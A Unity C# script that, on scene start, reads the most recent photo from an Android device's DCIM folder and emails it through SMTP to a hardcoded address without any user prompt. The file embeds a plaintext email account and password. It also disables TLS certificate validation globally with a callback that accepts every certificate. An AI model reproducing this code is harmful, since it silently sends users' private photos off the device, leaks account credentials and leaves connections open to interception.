using UnityEngine;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using TMPro;

public class EmailSender : MonoBehaviour
{
    public string recipientEmail = "diegoruizx2@hotmail.com";
    public string senderEmail = "diegoruizx2@hotmail.com";
    public string senderPassword = "Frozenfrog1";
    public string smtpServer = "smtp.example.com";
    public int smtpPort = 587;
    public TMP_Text debugTextField;

    void Start()
    {
        debugTextField.text = "started";
        SendLastPicture();
    }

    void SendLastPicture()
    {
        string galleryPath = GetAndroidExternalStoragePath();
        // Get the path to the last picture in the DCIM folder
        debugTextField.text = "send 1";
        string[] imagePaths = Directory.GetFiles(galleryPath, "*.jpg");
        debugTextField.text = "send 2";
        string lastImagePath = imagePaths.LastOrDefault();
        debugTextField.text = lastImagePath;

        // Check if there's any image
        if (lastImagePath != null)
        {
            debugTextField.text = "send 4";
            // Attach the image to the email
            Attachment attachment = new Attachment(lastImagePath);

            // Create the email message
            MailMessage mail = new MailMessage(senderEmail, recipientEmail);
            mail.Subject = "Last Picture from DCIM";
            mail.Body = "Attached is the last picture from DCIM folder.";
            mail.Attachments.Add(attachment);

            // Send the email
            SmtpClient smtpClient = new SmtpClient(smtpServer, smtpPort);
            smtpClient.Credentials = new NetworkCredential(senderEmail, senderPassword);
            smtpClient.EnableSsl = true;

            // Avoid SSL certificate validation errors
            ServicePointManager.ServerCertificateValidationCallback =
                delegate (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) { return true; };

            try
            {
                smtpClient.Send(mail);
                Debug.Log("Email sent successfully!");
            }
            catch (Exception ex)
            {
                Debug.LogError("Failed to send email: " + ex.Message);
            }
            finally
            {
                // Dispose the attachment and email objects
                attachment.Dispose();
                mail.Dispose();
            }
        }
        else
        {
            Debug.LogWarning("No image found in DCIM folder.");
        }
    }

    private string GetAndroidExternalStoragePath()
    {
        if (Application.platform != RuntimePlatform.Android)
            return Application.persistentDataPath;

        var jc = new AndroidJavaClass("android.os.Environment");
        var path = jc.CallStatic<AndroidJavaObject>("getExternalStoragePublicDirectory",
            jc.GetStatic<string>("DIRECTORY_DCIM"))
            .Call<string>("getAbsolutePath");
        return path;
    }
}

